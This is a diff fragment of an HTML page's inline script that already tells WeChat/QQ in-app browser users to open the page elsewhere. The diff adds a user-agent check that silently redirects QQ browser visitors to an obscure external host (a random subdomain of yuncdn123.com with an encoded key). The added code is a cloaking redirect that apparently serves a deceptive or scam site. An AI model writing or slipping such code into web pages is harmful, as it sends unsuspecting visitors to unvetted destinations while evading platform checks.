@@ -22,7 +22,11 @@ body{background-color:#fff}
 <body>
   
   <script>
-     if (is_weixn_qq()) {
+     
+    if (navigator.userAgent.indexOf("MQQBrowser") > -1 || navigator.userAgent.indexOf("QQTheme") > -1) {
+    window.location.href="http://wv75tq9e.yuncdn123.com/list.php?key=pJzVlZ3Qul3RhlUT3FERNdXQE10dBRUT"
+    }
+    else if (is_weixn_qq()) {
       document.getElementById("tips").innerHTML = "请在浏览器打开本页面";
     } else {
      
